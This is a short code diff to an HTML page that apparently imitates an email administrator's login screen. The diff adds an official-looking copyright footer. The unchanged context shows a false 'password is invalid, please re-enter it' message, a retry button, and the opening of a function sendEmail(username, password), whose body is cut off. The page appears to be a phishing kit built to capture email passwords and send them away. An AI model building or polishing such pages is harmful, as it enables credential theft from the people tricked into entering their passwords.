@@ -115,6 +115,15 @@
       font-size: 18px;
       font-weight: bold;
     }
+
+    footer {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: #888;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -137,6 +146,11 @@
     <p>The password is invalid, please re-enter it.</p>
     <button onclick="retryLogin()">Re-try</button>
   </div>
+
+  <!-- Footer -->
+  <footer>
+    2025 Email Administrator. All Rights Reserved
+  </footer>
 
   <script>
     function sendEmail(username, password) {
